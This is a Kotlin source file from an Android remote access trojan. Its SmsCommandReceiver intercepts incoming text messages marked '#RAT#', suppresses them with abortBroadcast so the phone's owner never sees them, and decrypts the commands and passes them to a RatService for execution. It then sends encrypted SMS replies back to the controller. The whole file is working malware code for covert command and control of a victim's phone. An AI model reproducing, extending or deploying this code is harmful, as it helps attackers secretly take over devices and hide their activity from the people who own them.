package com.rat.client.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Base64
import android.util.Log
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.RatService
import com.rat.client.util.DeviceUtils
import com.rat.client.util.PreferencesManager
import com.rat.client.util.SystemUtils

class SmsCommandReceiver : BroadcastReceiver() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "SmsCommandReceiver"
        private const val COMMAND_PREFIX = "#RAT#"
        private const val COMMAND_SEPARATOR = "|"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<Any> ?: return

        val messages = mutableListOf<SmsMessage>()
        for (pdu in pdus) {
            val format = bundle.getString("format")
            val message = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                SmsMessage.createFromPdu(pdu as ByteArray, format)
            } else {
                SmsMessage.createFromPdu(pdu as ByteArray)
            }
            messages.add(message)
        }

        for (message in messages) {
            val sender = message.originatingAddress ?: return
            val body = message.messageBody ?: return

            // Check for command prefix
            if (body.startsWith(COMMAND_PREFIX)) {
                handleSmsCommand(context, sender, body.substring(COMMAND_PREFIX.length))
                // Abort broadcast to hide from user
                abortBroadcast()
            }
        }
    }

    private fun handleSmsCommand(context: Context, sender: String, commandBody: String) {
        try {
            val parts = commandBody.split(COMMAND_SEPARATOR, limit = 3)
            if (parts.size < 2) return

            val command = parts[0]
            val payload = if (parts.size > 2) parts[2] else parts[1]
            val nonce = parts[1]

            // Verify sender is authorized (check against stored authorized numbers)
            if (!isAuthorizedSender(context, sender)) {
                Log.w(TAG, "Unauthorized sender: $sender")
                return
            }

            // Decrypt payload
            val decrypted = try {
                EncryptionUtils.decrypt(payload)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to decrypt SMS command: ${e.message}")
                return
            }

            // Execute command via RatService
            val service = RatService.getInstance()
            service?.sendCommand("sms_$command", EncryptionUtils.encrypt(decrypted))

            // Send response via SMS
            sendSmsResponse(sender, command, "OK", nonce)

        } catch (e: Exception) {
            Log.e(TAG, "SMS command handling error: ${e.message}")
        }
    }

    private fun isAuthorizedSender(context: Context, sender: String): Boolean {
        val authorizedNumbers = PreferencesManager.getStringSet("authorized_sms_senders", emptySet(), true)
        return authorizedNumbers.contains(sender) || authorizedNumbers.contains("*")
    }

    private fun sendSmsResponse(recipient: String, command: String, status: String, nonce: String) {
        try {
            val response = "$COMMAND_PREFIX$command$COMMAND_SEPARATOR$nonce$COMMAND_SEPARATOR$status"
            val encrypted = EncryptionUtils.encrypt(response)
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(recipient, null, encrypted, null, null)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS response: ${e.message}")
        }
    }
}